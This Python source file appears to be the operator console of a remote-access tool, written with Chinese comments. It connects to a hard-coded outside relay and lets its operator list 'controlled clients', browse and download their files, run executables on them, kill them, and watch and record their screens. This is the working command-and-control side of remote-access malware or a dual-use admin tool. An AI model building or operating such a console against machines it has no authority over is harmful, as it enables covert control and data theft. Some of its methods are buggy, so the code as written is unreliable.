import base64
import json
import os
import random
import string
import socket
import sys
import threading
import time
from typing import Dict, Any, Optional, List

from PyQt5.QtCore import Qt, QSize
from PyQt5.QtGui import QImage
from PyQt5.QtGui import QPixmap
from PyQt5.QtWidgets import QApplication
from PyQt5.QtWidgets import QWidget, QLabel, QVBoxLayout

import signal


class Control:
    def __init__(self, host: str, port: int) -> None:
        self.host = host
        self.port = port
        self.controlled_client_list = []
        self.remote_control_list = []
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.lock = threading.Lock()
        self.running = True
        self.socket.connect((self.host, self.port))
        self.id: Optional[str] = None
        self.init_control()
        self.recv_thread = threading.Thread(target=self.receive_message, daemon=True)
        self.input_thread = threading.Thread(target=self.input_command, daemon=True)
        self.recv_thread.start()
        self.input_thread.start()

        signal.signal(signal.SIGINT, self.handle_exit)
        signal.signal(signal.SIGTERM, self.handle_exit)

        while self.running:
            pass

    def handle_exit(self, signum, frame):
        self.send_message({"mode": "close"})
        self.close()

    def _create_task_id(self) -> str:
        return 'id_' + ''.join(random.choices(string.ascii_letters + string.digits, k=10))

    def init_control(self) -> None:
        init_message = {"mode": "init",  "client_mode": "control"}
        self.send_message(init_message)

    def send_message(self, message: Dict[str, Any]) -> None:
        self.socket.send(json.dumps(message).encode('utf-8'))

    def receive_message(self) -> None:
        buffer = ""
        while self.running:
            data = self.socket.recv(1048576).decode('utf-8')
            buffer += data
            while True:
                try:
                    msg, idx = json.JSONDecoder().raw_decode(buffer)
                    self.handle_message(msg)
                    buffer = buffer[idx:].lstrip()
                except ValueError:
                    break

    def print_client_list(self, client_list: List[Dict[str, Any]]) -> None:
        print("\n{:<6} {:<15} {:<15} {:<10} {:<20}".format(
            "NUMBER", "ID", "IP", "PORT", "TIME"))
        for i, client in enumerate(client_list, 1):
            print("{:<6} {:<15} {:<15} {:<10} {:<20}".format(
                i, client['id'], client['ip'], client['port'], client['time']))

    def print_directory(self, data: Dict[str, Any]) -> None:
        print(f"\nClient {data['data']['client_id']} directory listing for {data['data']['root']}:")
        for file in data['data']['list']:
            print(f"  - {file}")

    def print_run(self, data: Dict[str, Any]) -> None:
        if data["data"]["state"] == "success":
            print(f"\nClient {data['data']['client_id']} run {data['data']['exe_path']} successfully")
        elif data["data"]["state"] == "error":
            print(f"\nClient_{data['data']['client_id']} run {data['data']['exe_path']} error:")
            print(f"{data['data']['error']}")
    def save_downloaded_file(self, data: Dict[str, Any]) -> None:
        output_path = data["data"]["output"]
        file_name = os.path.basename(data["data"]["file"])
        file_path = os.path.join(output_path, file_name)
        chunk = data["data"].get("chunk", False)

        with open(file_path, "ab+") as d:
            if chunk:
                binary_data = bytes.fromhex(data["data"]["data"])
                d.write(binary_data)
            else:
                print(f"\nFile downloaded successfully to: {file_path}\n")

    def get_remote_control(self, id):
        for r in self.remote_control_list:
            if r["remote_control_id"] == id:
                return r

        return {}

    def remote_control(self, data):

        remote_control_info = self.get_remote_control(data["remote_control_id"])
        ui = remote_control_info["ui"]
        img_data = base64.b64decode(data["data"]["img"])
        qimage = QImage.fromData(img_data)
        pix = QPixmap.fromImage(qimage)
        ui.update_img(pix)

    def remote_control_ui_thearding(self, remote_control_info: Dict, info: Dict) -> None:
        app = QApplication(sys.argv)
        remote_control_ui = RemoteControlUI(info)
        remote_control_info["ui"] = remote_control_ui
        sys.exit(app.exec_())

    def start_remote_control(self, default_params: Dict, client_id: str):

        remote_control_id = self._create_task_id()
        remote_control_info = {"remote_control_id": remote_control_id, "ui_thearding": None, "ui": None}

        self.send_message({
            "mode": "init_remote_control",
            "data": {
                "remote_control_id": remote_control_id,
                "client_id": client_id,
                "controll_client_id": self.id,
                "default_params": default_params
            }
        })

        if not hasattr(self, 'remote_control_ui'):
            ui_thearding = threading.Thread(target=self.remote_control_ui_thearding, args=(remote_control_info, {
                "client_id": client_id,
                "params": default_params,
                "remote_control_id": remote_control_id,
                "parent_control": self
            },), daemon=True)
            ui_thearding.start()
            remote_control_info["ui_thearding"] = ui_thearding
            with self.lock:
                self.remote_control_list.append(remote_control_info)
    def stop_remote_control(self, remote_control_id: str) -> None:
        remote_control_info = self.get_remote_control(remote_control_id)
        remote_control_info["ui_thearding"].stop()
        del remote_control_info

    def init_remote_control(self, params: Dict) -> None:
        default_params = {
            "fps": 25,
            "definition": 720,
            "mouse": False,
            "recording": False,
            "output": None
        }

        for key in params:
            if key in default_params:
                if key in ["fps", "definition"]:
                    default_params[key] = int(params[key])
                elif key in ["mouse", "recording"]:
                    default_params[key] = params[key].lower() == "true"
                else:
                    default_params[key] = params[key]

        if "client_id" not in params:
            print("Error: client_id parameter is required")
            return

        if params["client_id"] == "all":
            for cd in self.controlled_client_list:
                self.start_remote_control(default_params, cd["id"])
                time.sleep(1)
        elif type(params["client_id"]) == list:
            for cd in params["client_id"]:
                self.start_remote_control(default_params, cd)
        elif type(params["client_id"]) == str:
            self.start_remote_control(default_params, params["client_id"])

    def handle_message(self, data: Dict[str, Any]) -> None:
        if data["mode"] == "init":
            self.id = data["id"]
        elif data["mode"] == "client_list":
            self.print_client_list(data["data"])
        elif data["mode"] == "update_controlled_client_list":
            self.controlled_client_list = data["list"]
        elif data["mode"] == "return":
            if data["data"]["mode"] == "dir":
                self.print_directory(data)
            elif data["data"]["mode"] == "run":
                self.print_run(data)
            elif data["data"]["mode"] == "download":
                self.save_downloaded_file(data)
            elif data["data"]["mode"] == "remote_control":
                self.remote_control(data)

    def directory(self, client_id: str, root: str) -> None:
        self.send_message({
            "mode": "directory",
            "data": {
                "client_id": client_id,
                "root": root
            }
        })

    def init_download(self, client_id: str, file_path: str, output_path: str) -> None:
        self.send_message({
            "mode": "init_download",
            "data": {
                "client_id": client_id,
                "file": file_path,
                "output": output_path
            }
        })

    def run(self, params: Dict) -> None:
        self.send_message({
            "mode": "run",
            "data": {
                "client_id": params["client_id"],
                "controll_client_id": self.id,
                "exe_path": params["exe_path"],
            }
        })

    def close(self) -> None:
        self.socket.close()

        self.running = False
        if hasattr(self, 'recv_thread') and self.recv_thread.is_alive():
            self.recv_thread.join()
        if hasattr(self, 'input_thread') and self.input_thread.is_alive():
            self.input_thread.join()
        sys.exit()
    def kill_client(self, params):
        self.send_message({
            "mode": "kill_client",
            "data": {
                "client_id": params["client_id"],
                "controll_client_id": self.id,
            }
        })
    def input_command(self) -> None:
        help_text = """
Available commands:
  /client_list                  - List all controlled clients
  /run -client_id=ID -exe_path=EXE_PATH - List all controlled clients
  /dir -client_id=ID -root=PATH - List directory contents
  /download -client_id=ID -file=SRC -output=DST - Download file
  /remote_control -client_id=ID -fps=FPS -definition=[360, 480, 720, 1080, 2k, 4k] -mouse=BOOL -recording=BOOL -output=PATH  - Remotely control a client
  /exit                         - Exit the program
"""
        while self.running:
            input_txt = input("").strip()
            if not input_txt:
                continue

            if input_txt.startswith("/"):
                parts = input_txt.split()
                command = parts[0]
                params = self._parse_params(parts[1:])

                if command == "/exit":
                    self.close()
                elif command == "/client_list":
                    self.print_client_list(self.controlled_client_list)
                elif command == "/kill_client":
                    self.kill_client(self.controlled_client_list)
                elif command == "/dir":
                    self._handle_dir_command(params)
                elif command == "/download":
                    self._handle_download_command(params)
                elif command == "/remote_control":
                    self._handle_remote_control_command(params)
                elif command == "/run":
                    self._handle_run_command(params)
                elif command == "/help":
                    print(help_text)
                else:
                    print(f"Unknown command: {command}")
            else:
                print("Commands must start with '/'. Type /help for available commands.")
            time.sleep(0.5)

    def _parse_params(self, parts: List[str]) -> Dict[str, str]:
        params = {}
        current_key = None
        current_value = []

        for part in parts:
            # 如果部分以 "-" 开头且包含 "=", 则表示新的键值对
            if part.startswith("-") and "=" in part:
                if current_key is not None:
                    # 保存之前的键值对
                    value = ' '.join(current_value).strip('"')
                    params[current_key] = value
                    current_value = []

                # 解析新的键值对
                key, value = part[1:].split("=", 1)
                current_key = key
                current_value.append(value)
            else:
                # 如果当前部分不是新的键值对，则继续添加到当前值中
                current_value.append(part)

        # 处理最后一个键值对
        if current_key is not None:
            value = ' '.join(current_value).strip('"')
            params[current_key] = value

        return params

    def _handle_dir_command(self, params: Dict[str, str]) -> None:
        if "client_id" not in params or "root" not in params:
            print("Error: Both -client_id and -root parameters are required")
            return
        self.directory(params["client_id"], params["root"])

    def _handle_download_command(self, params: Dict[str, str]) -> None:
        required = ["client_id", "file"]
        if not all(p in params for p in required):
            print("Error: -client_id and -file parameters are required")
            return
        output = params.get("output", "")
        self.init_download(params["client_id"], params["file"], output)

    def _handle_remote_control_command(self, params: Dict) -> None:
        if "client_id" not in params:
            print("Error: Both -client_id parameters are required")
            return
        self.init_remote_control(params)

    def _handle_run_command(self, params: Dict) -> None:
        if "client_id" not in params:
            print("Error: Both -client_id parameters are required")
            return
        self.run(params)

class RemoteControlUI(QWidget):
    def __init__(self, info: Dict):
        super().__init__()
        self.setWindowTitle(f"Remote Control 受控端：{info['client_id']} fps:{info['params']['fps']} 清晰度:{info['params']['definition']}")
        self.info = info
        self.setFixedSize(1280, 720)
        self.img_label = QLabel(self)
        self.img_label.setAlignment(Qt.AlignCenter)
        self.img_label.setFixedSize(1280, 720)

        self.layout = QVBoxLayout()
        self.layout.setContentsMargins(0, 0, 0, 0)
        self.layout.addWidget(self.img_label)
        self.setLayout(self.layout)
        self.original_pixmap_size = QSize()
        self.show()
        self.remote_control_id = info["remote_control_id"]
        self.parent_control = info.get("parent_control")

    def update_img(self, pixmap):
        self.original_pixmap_size = pixmap.size()
        scaled_pixmap = pixmap.scaled(
            self.img_label.size(),
            Qt.KeepAspectRatio,
            Qt.SmoothTransformation
        )
        self.img_label.setPixmap(scaled_pixmap)
        self.img_label.setAlignment(Qt.AlignCenter)

    def closeEvent(self, event):
        # 执行关闭窗口时的逻辑
        self.cleanup()
        event.accept()

    def cleanup(self):
        if self.parent_control:
            with self.parent_control.lock:
                for i, r in enumerate(self.parent_control.remote_control_list):
                    if r["remote_control_id"] == self.remote_control_id:
                        self.parent_control.remote_control_list.pop(i)
                        break
            self.parent_control.send_message({
            "mode": "stop_remote_control",
            "data": {
                "client_id": self.info["client_id"],
                "remote_control_id": self.info["remote_control_id"]
            }
        })
            self.parent_control.stop_remote_control()

if __name__ == "__main__":
    control = Control('us-sjc-bgp-1.ofalias.org', 60813)